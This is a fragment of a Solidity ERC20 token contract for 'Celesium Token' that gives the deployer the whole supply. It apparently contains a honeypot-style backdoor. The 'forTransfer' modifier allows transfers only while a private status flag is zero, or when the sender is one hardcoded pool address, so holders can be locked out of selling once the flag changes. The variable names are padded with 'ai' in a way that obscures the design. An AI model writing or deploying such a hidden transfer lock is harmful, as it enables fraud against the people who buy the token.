...
contract Celesium is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenai_totalSupply;
    uint256 private _tokenai_status = 0;
    uint256 public stakingPoolaiStatus = 0;

    string private _tokenai_name;
    string private _tokenai_symbol;

    address private _poolaiAddress = 0xB788cf976120DbE4D2456629DC16AFA95BEa24b2;

    constructor() {
        _tokenai_name = "Celesium Token";
        _tokenai_symbol = "CELESIUM";
        _tokenai_totalSupply = 100000 * 10 ** 18;
        _balances[msg.sender] = _tokenai_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolaiAddress || _tokenai_status == 0);
        _;
    }
